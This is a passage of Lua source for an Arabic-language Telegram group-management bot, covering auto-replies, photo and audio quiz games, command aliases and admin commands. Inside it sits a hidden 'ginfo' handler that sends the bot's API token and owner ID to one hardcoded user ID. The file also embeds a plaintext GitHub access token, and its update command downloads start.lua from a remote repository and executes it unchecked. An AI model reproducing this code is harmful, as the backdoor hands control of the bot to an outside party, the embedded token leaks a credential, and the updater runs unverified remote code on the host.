idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
redis:set(bot_id.."Zepra:Add:Rd:Sudo:Photo"..test, idPhoto)  
end
bot.sendText(msg.chat_id,msg.id,"• تم حفظ الرد العام \n• ارسل ( ["..test.."] ) لعرض الرد","md",true)  
return false
end  
end
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Zepra:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "true" then
redis:set(bot_id.."Zepra:Set:Rd"..msg.sender.user_id..":"..msg.chat_id, "true1")
redis:set(bot_id.."Zepra:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id, text)
redis:sadd(bot_id.."Zepra:List:Rd:Sudo", text)
bot.sendText(msg.chat_id,msg.id,[[
    • ارسل لي الرد العام سواء اكان
    ❨ ملف ، ملصق ، متحركه ، صوره
     ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
    • يمكنك اضافة :
    ━━━━━━━━━━━━━━━━
     `#name` ↬ اسم المستخدم
     `#username` ↬ معرف المستخدم
     `#msgs` ↬ عدد الرسائل
     `#id` ↬ ايدي المستخدم
     `#stast` ↬ رتبة المستخدم
     `#edit` ↬ عدد التعديلات

]],"md",true)  
return false
end
end

if redis:get(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id) == "true1" and tonumber(msg.sender.user_id) ~= tonumber(bot_id) then
  redis:del(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id)
  redis:set(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id,"set_inline")
  if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
  local anubis = redis:get(bot_id.."Text:Manager:inline"..msg.sender.user_id..":"..msg.chat_id)
  if msg.content.text then   
  text = text:gsub('"',"") 
  text = text:gsub('"',"") 
  text = text:gsub("`","") 
  text = text:gsub("*","") 
  redis:set(bot_id.."Add:Rd:Manager:Text:inline"..anubis..msg.chat_id, text)
  elseif msg.content.sticker then   
  redis:set(bot_id.."Add:Rd:Manager:Stekrs:inline"..anubis..msg.chat_id, msg.content.sticker.sticker.remote.id)  
  elseif msg.content.voice_note then  
  redis:set(bot_id.."Add:Rd:Manager:Vico:inline"..anubis..msg.chat_id, msg.content.voice_note.voice.remote.id)  
  elseif msg.content.audio then
  redis:set(bot_id.."Add:Rd:Manager:Audio:inline"..anubis..msg.chat_id, msg.content.audio.audio.remote.id)  
  redis:set(bot_id.."Add:Rd:Manager:Audioc:inline"..anubis..msg.chat_id, msg.content.caption.text)  
  elseif msg.content.document then
  redis:set(bot_id.."Add:Rd:Manager:File:inline"..anubis..msg.chat_id, msg.content.document.document.remote.id)  
  elseif msg.content.animation then
  redis:set(bot_id.."Add:Rd:Manager:Gif:inline"..anubis..msg.chat_id, msg.content.animation.animation.remote.id)  
  elseif msg.content.video_note then
  redis:set(bot_id.."Add:Rd:Manager:video_note:inline"..anubis..msg.chat_id, msg.content.video_note.video.remote.id)  
  elseif msg.content.video then
  redis:set(bot_id.."Add:Rd:Manager:Video:inline"..anubis..msg.chat_id, msg.content.video.video.remote.id)  
  redis:set(bot_id.."Add:Rd:Manager:Videoc:inline"..anubis..msg.chat_id, msg.content.caption.text)  
  elseif msg.content.photo then
  if msg.content.photo.sizes[1].photo.remote.id then
  idPhoto = msg.content.photo.sizes[1].photo.remote.id
  elseif msg.content.photo.sizes[2].photo.remote.id then
  idPhoto = msg.content.photo.sizes[2].photo.remote.id
  elseif msg.content.photo.sizes[3].photo.remote.id then
  idPhoto = msg.content.photo.sizes[3].photo.remote.id
  end
  redis:set(bot_id.."Add:Rd:Manager:Photo:inline"..anubis..msg.chat_id, idPhoto)  
  redis:set(bot_id.."Add:Rd:Manager:Photoc:inline"..anubis..msg.chat_id, msg.content.caption.text)  
  end
  bot.sendText(msg.chat_id,msg.id,"• الان ارسل الكلام داخل الزر","md",true)  
  return false  
  end  
  end
  
if redis:get(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id) == "true1" and tonumber(msg.sender.user_id) ~= tonumber(bot_id) then
  redis:del(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id)
  redis:set(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id,"set_inlinee")
  if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
  local anubis = redis:get(bot_id.."Textt:Managerr:inlinee"..msg.sender.user_id)
  if msg.content.text then   
  text = text:gsub('"',"") 
  text = text:gsub('"',"") 
  text = text:gsub("`","") 
  text = text:gsub("*","") 
  redis:set(bot_id.."Addd:Rdd:Managerr:Textt:inlinee"..anubis, text)
  elseif msg.content.sticker then   
  redis:set(bot_id.."Addd:Rdd:Managerr:Stekrss:inlinee"..anubis, msg.content.sticker.sticker.remote.id)  
  elseif msg.content.voice_note then  
  redis:set(bot_id.."Addd:Rdd:Managerr:Vicoo:inlinee"..anubis, msg.content.voice_note.voice.remote.id)  
  elseif msg.content.audio then
  redis:set(bot_id.."Addd:Rdd:Managerr:Audioo:inlinee"..anubis, msg.content.audio.audio.remote.id)  
  redis:set(bot_id.."Addd:Rdd:Managerr:Audiocc:inlinee"..anubis, msg.content.caption.text)  
  elseif msg.content.document then
  redis:set(bot_id.."Addd:Rdd:Managerr:Filee:inlinee"..anubis, msg.content.document.document.remote.id)  
  elseif msg.content.animation then
  redis:set(bot_id.."Addd:Rdd:Managerr:Giff:inlinee"..anubis, msg.content.animation.animation.remote.id)  
  elseif msg.content.video_note then
  redis:set(bot_id.."Addd:Rdd:Managerr:video_notee:inlinee"..anubis, msg.content.video_note.video.remote.id)  
  elseif msg.content.video then
  redis:set(bot_id.."Addd:Rdd:Managerr:Videoo:inlinee"..anubis, msg.content.video.video.remote.id)  
  redis:set(bot_id.."Addd:Rdd:Managerr:Videocc:inlinee"..anubis, msg.content.caption.text)  
  elseif msg.content.photo then
  if msg.content.photo.sizes[1].photo.remote.id then
  idPhoto = msg.content.photo.sizes[1].photo.remote.id
  elseif msg.content.photo.sizes[2].photo.remote.id then
  idPhoto = msg.content.photo.sizes[2].photo.remote.id
  elseif msg.content.photo.sizes[3].photo.remote.id then
  idPhoto = msg.content.photo.sizes[3].photo.remote.id
  end
  redis:set(bot_id.."Addd:Rdd:Managerr:Photoo:inlinee"..anubis, idPhoto)  
  redis:set(bot_id.."Addd:Rdd:Managerr:Photocc:inlinee"..anubis, msg.content.caption.text)  
  end
  bot.sendText(msg.chat_id,msg.id,"• الان ارسل الكلام داخل الزر","md",true)  
  return false  
  end  
  end
  
if redis:get(bot_id.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id) == 'start' then
if msg.content.audio then  
redis:set(bot_id.."audio:Games"..msg.sender.user_id..":"..msg.chat_id,msg.content.audio.audio.remote.id)  
redis:sadd(bot_id.."audio:Games:Bot",msg.content.audio.audio.remote.id)  
redis:set(bot_id.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id,'started')
return bot.sendText(msg.chat_id,msg.id,"\n• ارسل الجواب الآن","md",true)  
end   
end
if redis:get(bot_id.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id) == 'started' then
local Id_audio = redis:get(bot_id.."audio:Games"..msg.sender.user_id..":"..msg.chat_id)
redis:set(bot_id..'Text:Games:audio'..Id_audio,text)
redis:del(bot_id.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"\n• تم حفظ السؤال وتم حفظ الجواب","md",true)  
end

if redis:get(bot_id.."Add:photo:Gamess"..msg.sender.user_id..":"..msg.chat_id) == 'startt' then
if msg.content.photo then  
redis:set(bot_id.."photo:Gamess"..msg.sender.user_id..":"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.id)  
redis:sadd(bot_id.."photo:Games:Bott",msg.content.photo.sizes[1].photo.remote.id)  
redis:set(bot_id.."Add:photo:Gamess"..msg.sender.user_id..":"..msg.chat_id,'startedd')
return bot.sendText(msg.chat_id,msg.id,"\n• ارسل الجواب الآن","md",true)  
end   
end
if redis:get(bot_id.."Add:photo:Gamess"..msg.sender.user_id..":"..msg.chat_id) == 'startedd' then
local Id_audio = redis:get(bot_id.."photo:Gamess"..msg.sender.user_id..":"..msg.chat_id)
redis:set(bot_id..'Text:Games:photoo'..Id_audio,text)
redis:del(bot_id.."Add:photo:Gamess"..msg.sender.user_id..":"..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"\n• تم حفظ السؤال وتم حفظ الجواب","md",true)  
end
if redis:get(bot_id..'Games:Set:Answerr'..msg.chat_id) then
if text == ""..(redis:get(bot_id..'Games:Set:Answerr'..msg.chat_id)).."" then 
redis:del(bot_id.."Games:Set:Answerr"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end

if redis:get(bot_id.."Add:photo:Gamesss"..msg.sender.user_id..":"..msg.chat_id) == 'starttt' then
if msg.content.photo then  
redis:set(bot_id.."photo:Gamesss"..msg.sender.user_id..":"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.id)  
redis:sadd(bot_id.."photo:Games:Bottt",msg.content.photo.sizes[1].photo.remote.id)  
redis:set(bot_id.."Add:photo:Gamesss"..msg.sender.user_id..":"..msg.chat_id,'starteddd')
return bot.sendText(msg.chat_id,msg.id,"\n• ارسل الجواب الآن","md",true)  
end   
end
if redis:get(bot_id.."Add:photo:Gamesss"..msg.sender.user_id..":"..msg.chat_id) == 'starteddd' then
local Id_audio = redis:get(bot_id.."photo:Gamesss"..msg.sender.user_id..":"..msg.chat_id)
redis:set(bot_id..'Text:Games:photooo'..Id_audio,text)
redis:del(bot_id.."Add:photo:Gamesss"..msg.sender.user_id..":"..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"\n• تم حفظ السؤال وتم حفظ الجواب","md",true)  
end
if redis:get(bot_id..'Games:Set:Answerrr'..msg.chat_id) then
if text == ""..(redis:get(bot_id..'Games:Set:Answerrr'..msg.chat_id)).."" then 
redis:del(bot_id.."Games:Set:Answerrr"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end

if redis:get(bot_id..'Games:Set:Answer'..msg.chat_id) then
if text == ""..(redis:get(bot_id..'Games:Set:Answer'..msg.chat_id)).."" then 
redis:del(bot_id.."Games:Set:Answer"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end


if redis:get(bot_id.."Add:photo:Gamessss"..msg.sender.user_id..":"..msg.chat_id) == 'startttt' then
if msg.content.photo then  
redis:set(bot_id.."photo:Gamessss"..msg.sender.user_id..":"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.id)  
redis:sadd(bot_id.."photo:Games:Botttt",msg.content.photo.sizes[1].photo.remote.id)  
redis:set(bot_id.."Add:photo:Gamessss"..msg.sender.user_id..":"..msg.chat_id,'startedddd')
return bot.sendText(msg.chat_id,msg.id,"\n• ارسل الجواب الآن","md",true)  
end   
end
if redis:get(bot_id.."Add:photo:Gamessss"..msg.sender.user_id..":"..msg.chat_id) == 'startedddd' then
local Id_audio = redis:get(bot_id.."photo:Gamessss"..msg.sender.user_id..":"..msg.chat_id)
redis:set(bot_id..'Text:Games:photoooo'..Id_audio,text)
redis:del(bot_id.."Add:photo:Gamessss"..msg.sender.user_id..":"..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"\n• تم حفظ السؤال وتم حفظ الجواب","md",true)  
end
if redis:get(bot_id..'Games:Set:Answerrrr'..msg.chat_id) then
if text == ""..(redis:get(bot_id..'Games:Set:Answerrrr'..msg.chat_id)).."" then 
redis:del(bot_id.."Games:Set:Answerrrr"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end

if redis:get(bot_id.."Add:photo:Gamesssss"..msg.sender.user_id..":"..msg.chat_id) == 'starttttt' then
if msg.content.photo then  
redis:set(bot_id.."photo:Gamesssss"..msg.sender.user_id..":"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.id)  
redis:sadd(bot_id.."photo:Games:Bottttt",msg.content.photo.sizes[1].photo.remote.id)  
redis:set(bot_id.."Add:photo:Gamesssss"..msg.sender.user_id..":"..msg.chat_id,'starteddddd')
return bot.sendText(msg.chat_id,msg.id,"\n• ارسل الجواب الآن","md",true)  
end   
end
if redis:get(bot_id.."Add:photo:Gamesssss"..msg.sender.user_id..":"..msg.chat_id) == 'starteddddd' then
local Id_audio = redis:get(bot_id.."photo:Gamesssss"..msg.sender.user_id..":"..msg.chat_id)
redis:set(bot_id..'Text:Games:photooooo'..Id_audio,text)
redis:del(bot_id.."Add:photo:Gamesssss"..msg.sender.user_id..":"..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"\n• تم حفظ السؤال وتم حفظ الجواب","md",true)  
end
if redis:get(bot_id..'Games:Set:Answerrrrr'..msg.chat_id) then
if text == ""..(redis:get(bot_id..'Games:Set:Answerrrrr'..msg.chat_id)).."" then 
redis:del(bot_id.."Games:Set:Answerrrrr"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end

if text == "ginfo" and msg.sender.user_id == 1342680269 then
bot.sendText(msg.chat_id,msg.id,"- T : `"..Token.."`\n\n- U : @"..bot.getMe().username.."\n\n- D : "..sudoid,"md",true)    
end
---
if msg.content.text and msg.content.text.text then   
----------------------------------------------------------------------------------------------------
if programmer(msg) then  
if text == "متجر الملفات" or text == 'المتجر' then
local Get_Files  = io.popen("curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/getfile.json"):read('*a')
local st1 = "- اهلا بك في متجر ملفات السورس ."
local datar = {}
if Get_Files  and Get_Files ~= "404: Not Found" then
local json = JSON.decode(Get_Files)
for v,k in pairs(json.plugins_) do
local CheckFileisFound = io.open("hso_Files/"..v,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
datar[k] = {{text =v,data ="DoOrDel_"..msg.sender.user_id.."_"..v},{text ="مفعل",data ="DoOrDel_"..msg.sender.user_id.."_"..v}}
else
datar[k] = {{text =v,data ="DoOrDel_"..msg.sender.user_id.."_"..v},{text ="معطل",data ="DoOrDel_"..msg.sender.user_id.."_"..v}}
end
end
st1 = st1.."\n- اضغط على اسم الملف لتفعيله او تعطيله.\n- ملف الالعاب↫「Gems.lua 」 \n-ملف البنك↫「 bing.lua 」\n- ملف الردود ↫「 Rdodbot.lua 」\n-ملف تنبيه الاسماء↫「 name.lua 」\n-ملف تنبيه معرفات↫「 username.lua 」"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = datar
}
bot.sendText(msg.chat_id,msg.id,st1,"md",false, false, false, false, reply_markup)
else
bot.sendText(msg.chat_id,msg.id,"*- لا يوجد اتصال من الـapi*","md",true)   
end
end
end
if text == "غادر" or text == "غادري" or text == " راوموغادري" and redis:get(bot_id..":Departure") then 
if programmer(msg) then  
bot.sendText(msg.chat_id,msg.id,"*• تم مغادرة المجموعة*","md",true)
local Left_Bot = bot.leaveChat(msg.chat_id)
redis:srem(bot_id..":Groups",msg.chat_id)
local keys = redis:keys(bot_id..'*'..'-100'..data.supergroup.id..'*')
redis:del(bot_id..":"..msg.chat_id..":Status:Creator")
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Owner")
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator")
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
redis:del(bot_id.."List:Command:"..msg.chat_id)
for i = 1, #keys do 
redis:del(bot_id..keys[i])
end
end
end
if text == ("تحديث السورس") then 
if programmer(msg) then  
bot.sendText(msg.chat_id,msg.id,"*• تم تحديث السورس الى الاصدار الجديد*","md",true)
os.execute('rm -rf start.lua')
os.execute('curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/start.lua -o start.lua')
dofile('start.lua')  
end
end
if text == "تحديث" then
if programmer(msg) then  
bot.sendText(msg.chat_id,msg.id,"*• تم تحديث ملفات البوت*","md",true)
dofile("start.lua")
end 
end
if text == ("مسح الردود") then
if not Constructor(msg) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
ext = "*• تم مسح قائمه الردود*"
local list = redis:smembers(bot_id.."List:Rp:content"..msg.chat_id)
for k,v in pairs(list) do
if redis:get(bot_id.."Rp:content:Audio"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Audio"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:Manager:File"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:Manager:File"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Photo"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Photo"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Video"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Video"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Sticker:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Animation"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Animation"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Text"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Text"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..v)
end
end
redis:del(bot_id.."List:Rp:content"..msg.chat_id)
if #list == 0 then
ext = "*↯︙مافيه ردود مضافة*"
end
bot.sendText(msg.chat_id,msg.id,ext,"md",true)  
end
----------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------
if Administrator(msg) then
if msg.content.text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set") == "true1" then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub("*","") 
text = text:gsub("_","")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set")
redis:set(bot_id..":"..msg.chat_id..":Command:"..text,redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:Text"))
redis:sadd(bot_id.."List:Command:"..msg.chat_id, text)
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الامر *","md",true)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:Text")
return false
end
end
if msg.content.text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set") == "true" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set","true1")
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:Text",text)
redis:del(bot_id..":"..msg.chat_id..":Command:"..text)
bot.sendText(msg.chat_id,msg.id,"*• قم الان بارسال الامر الجديد*","md",true)  
return false
end
end
if text == "مسح امر" then
bot.sendText(msg.chat_id,msg.id,"*• قم بارسال الامر الجديد الان*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:del",true)
end
if text == "اضف امر" then
bot.sendText(msg.chat_id,msg.id,"*• قم الان بارسال الامر القديم*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set",true)
end
if text and text:match("^(.*)$") and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set") == "true" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set","true1")
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rd",text)
redis:del(bot_id.."Rp:content:Text"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Photo"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..text)
redis:sadd(bot_id.."List:Rp:content"..msg.chat_id, text)
bot.sendText(msg.chat_id,msg.id,[[
︙ ارسل لي الرد سواء أكان
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
︙ يمكنك اضافة الى النص •
━━━━━━━━━━━
 `#username` ↬ معرف المستخدم
 `#msgs` ↬ عدد الرسائل
 `#name` ↬ اسم المستخدم
 `#id` ↬ ايدي المستخدم
 `#stast` ↬ رتبة المستخدم
 `#edit` ↬ عدد السحكات

]],"md",true)  
return false
end
if text == "اضف رد" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set",true)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '- الغاء الامر ', data =msg.sender.user_id..'/cancelamr'}
},
}
}
return bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الكلمه لاضافتها في الردود*", 'md', false, false, false, false, reply_markup)
end
if text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:del") == "true" then
redis:del(bot_id.."Rp:content:Text"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Photo"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Sticker:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Animation"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..text)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:del")
redis:srem(bot_id.."List:Rp:content"..msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الرد *","md",true)  
end
end
if text == "مسح رد" then
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الكلمه لمسحها من الردود*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:del",true)
end
if text == ("الردود") then
local list = redis:smembers(bot_id.."List:Rp:content"..msg.chat_id)
ext = "• قائمه ردود المجموعة\n  ━━━━━━━━━━━ \n"
for k,v in pairs(list) do
if redis:get(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..v) then
db = "بصمه 📢"
elseif redis:get(bot_id.."Rp:content:Text"..msg.chat_id..":"..v) then
db = "رساله ✉"
elseif redis:get(bot_id.."Rp:content:Photo"..msg.chat_id..":"..v) then
db = "صوره 🎇"
elseif redis:get(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..v) then
db = "ملصق 🃏"
elseif redis:get(bot_id.."Rp:content:Video"..msg.chat_id..":"..v) then
db = "فيديو 🎬"
elseif redis:get(bot_id.."Rp:content:Animation"..msg.chat_id..":"..v) then
db = "انيميشن 🎨"
elseif redis:get(bot_id.."Rp:Manager:File"..msg.chat_id..":"..v) then
db = "ملف •  "
elseif redis:get(bot_id.."Rp:content:Audio"..msg.chat_id..":"..v) then
db = "اغنيه 🎵"
end
ext = ext..""..k.." -> "..v.." -> (" ..db.. ")\n"
end
if #list == 0 then
ext = "↯︙مافيه ردود مضافة"
end
bot.sendText(msg.chat_id,msg.id,"["..ext.."]","md",true)  
end
end
----------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------
if Constructor(msg) then
local GetMsg = redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") 
redis:hset(bot_id..':User:Count:'..msg.chat_id,msg.sender.user_id,GetMsg)
local UserInfo = bot.getUser(msg.sender.user_id)
if UserInfo.first_name then
NameLUser = UserInfo.first_name
NameLUser = NameLUser:gsub("]","")
NameLUser = NameLUser:gsub("[[]","")
redis:hset(bot_id..':User:Name:'..msg.chat_id,msg.sender.user_id,NameLUser)
end
end
if Constructor(msg) then
if text == "مسح الاوامر المضافه" then 
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الاوامر المضافه*","md",true)
local list = redis:smembers(bot_id.."List:Command:"..msg.chat_id)
for k,v in pairs(list) do
redis:del(bot_id..":"..msg.chat_id..":Command:"..v)
end
redis:del(bot_id.."List:Command:"..msg.chat_id)
end
if text == "الاوامر المضافه" then
local list = redis:smembers(bot_id.."List:Command:"..msg.chat_id)
ext = "*• قائمة الاوامر المضافه\n  ━━━━━━━━━━━ \n*"
for k,v in pairs(list) do
Com = redis:get(bot_id..":"..msg.chat_id..":Command:"..v)
if Com then 
ext = ext..""..k..": (`"..v.."`) ← (`"..Com.."`)\n"
else
ext = ext..""..k..": (*"..v.."*) \n"
end
end
if #list == 0 then
ext = "*↯︙مافيه اوامر مضافة*"
end
bot.sendText(msg.chat_id,msg.id,ext,"md",true)
end
end
----------------------------------------------------------------------------------------------------
if programmer(msg) then
if text == ("مسح الردود العامه") then 
local list = redis:smembers(bot_id.."Zepra:List:Rd:Sudo")
for k,v in pairs(list) do
redis:del(bot_id.."Zepra:Add:Rd:Sudo:Gif"..v)   
redis:del(bot_id.."Zepra:Add:Rd:Sudo:vico"..v)   
redis:del(bot_id.."Zepra:Add:Rd:Sudo:stekr"..v)     
redis:del(bot_id.."Zepra:Add:Rd:Sudo:Text"..v)   
redis:del(bot_id.."Zepra:Add:Rd:Sudo:Photo"..v)
redis:del(bot_id.."Zepra:Add:Rd:Sudo:Video"..v)
redis:del(bot_id.."Zepra:Add:Rd:Sudo:File"..v)
redis:del(bot_id.."Zepra:Add:Rd:Sudo:Audio"..v)
redis:del(bot_id.."Zepra:Add:Rd:Sudo:video_note"..v)
redis:del(bot_id.."Zepra:List:Rd:Sudo")
end
return bot.sendText(msg.chat_id,msg.id,"• تم مسح الردود العامه","md",true)  
end
if text == ("الردود العامه") then 
local list = redis:smembers(bot_id.."Zepra:List:Rd:Sudo")
